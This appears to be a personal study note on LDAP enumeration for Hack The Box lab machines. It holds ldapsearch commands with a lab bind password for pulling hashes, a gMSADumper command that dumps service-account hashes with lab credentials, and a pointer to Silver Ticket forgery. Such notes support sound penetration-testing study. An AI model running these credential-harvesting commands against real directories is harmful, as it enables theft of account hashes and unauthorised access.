---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[ldap]]  
___

## Description:  

`ldapsearch -x -h intelligence.htb -s base namingcontexts`

**Try to get base64 hashes
`ldapsearch -x -LLL -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb' -s sub '(objectClass=*)'`

**How to get hashes from ldap with valid creds
https://github.com/micahvandeusen/gMSADumper

`python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'

If you get a service account hash you can make a [[Silver Ticket#^4540be]]


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (03:19 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
